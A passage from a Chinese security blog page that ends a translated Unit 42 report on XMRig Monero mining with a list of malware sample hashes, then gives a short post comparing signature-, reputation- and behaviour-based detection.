<p>2f613d3d1c962106c1c7191c6f084702bb33f21100ac427f331ffe0d6a8ee9d1</p>
<p>7a428f6a12125b88c6878934c683da9d9bb1aaf16d1ddc682ddce17589fc0f2d</p>
<p>ed7b0d037c07aa0654aa74eb1ddd26e9933367270427e426beadcdf8825f77df</p>
<p>5380dd337c93e09bd663ec9ae408d271fdf455a1bd8c830020c1d295b9f80a6a</p>
<p>b7fa85f2eaca94e99f5ea8d9baf24bace903fc04321f26629298b4a2f59c21d7</p>
<p>4421d7c5228b55555703bc3c125ade2f613573a81947e4df999d2743dbf919fb</p>
<p>db694674c7bfaf016906138ef02008904d08b3033ba2a56ade72850d6d7cd2a1</p>
<p>6b8cdc31532f368af6041eb9990bd96c8b9114e06a009e4aa5a30e783a7cebd4</p>
<p>da546aa2d52d540cf5fb1a2568649f7235f4d922c2c50d29c503cf8b178e59a0</p>
<p>d75be032a2cd66e9bde4bd74ba7e74f1190b007736017b4cabbeba5eb93d6276</p>
<p>2b6bd11dde33afd408746bb993c2840bd750769ad4caef5e541c6d2d2ac1cf8f</p>
<p>翻译自：<a href="https://researchcenter.paloaltonetworks.com/2018/01/unit42-large-scale-monero-cryptocurrency-mining-operation-using-xmrig/" target="_blank" rel="external">https://researchcenter.paloaltonetworks.com/2018/01/unit42-large-scale-monero-cryptocurrency-mining-operation-using-xmrig/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/25/利用XMRig的大规模Monero挖矿行为/" data-id="cjl3ht17b0015ww9lybrymbn6" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-几种常见检测思路的特点" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/05/几种常见检测思路的特点/" class="article-date">
  <time datetime="2018-01-05T10:54:54.000Z" itemprop="datePublished">2018-01-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="特征检测"><a href="#特征检测" class="headerlink" title="特征检测"></a>特征检测</h4><p>应用广泛（防病毒、网络设备、……）技术原理简明易懂，实现不太难。需要有样本持续积累（各种漏洞库、恶意代码库）作为检测的依据。样本分析、积累成本和制造样本成本不对称时，攻击方可以制造大量样本 DoS 防守方的样本分析、检测资源，造成特征检测不可用。</p>
<h4 id="基于信誉"><a href="#基于信誉" class="headerlink" title="基于信誉"></a>基于信誉</h4><p>目前逐渐开始广泛应用（防病毒、网络设备、……），技术原理也比较简明易懂，实现也不太难。需要有检测的基础能力，并积累时间、IP、域名、URL、文件等其他纬度的数据（信誉库）。首先，信誉很高的对象一次恶意的行为可能无法通过信誉判断（例如，一个良好信誉的人一次性恶意透支所有信用卡限额），其次信誉库需要积累，而且存在覆盖度不够的情况，再次，攻击方同样可以<br> DoS 检测能力。</p>
<h4 id="基于行为"><a href="#基于行为" class="headerlink" title="基于行为"></a>基于行为</h4><p>对正常的行为模式进行建模，不符合模型的被判断为可疑，进一步判断后用于完善正常行为模型。应用范围有限，技术复杂度高，实现比较困难。找到普适的建模方法比较困难。工程上可能一开始就不具备建模的纯正常行为的环境，如何得到正常行为的模型也比较困难。模型判断为可疑，如何进一步判断实际上往往还需要前面几种检测方法参与，最终也很难实现自动化。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/05/几种常见检测思路的特点/" data-id="cjl3ht17c0016ww9lb0as8uk7" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Articles récents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/08/14/使用YARA规则进行威胁狩猎/">使用YARA规则进行威胁狩猎</a>
          </li>
        
          <li>
            <a href="/2018/07/31/Google-Safe-Browsing-Api介绍/">Google Safe Browsing Api介绍</a>
          </li>
        
          <li>
            <a href="/2018/06/29/数字取证入门/">数字取证入门</a>
          </li>
        
          <li>
            <a href="/2018/03/19/Dionaea蜜罐部署/">Dionaea蜜罐部署</a>
          </li>
        
          <li>
            <a href="/2018/03/12/Blackhat-SEO/">Blackhat SEO</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <!--
<footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 SY0U<br>
      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
-->

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>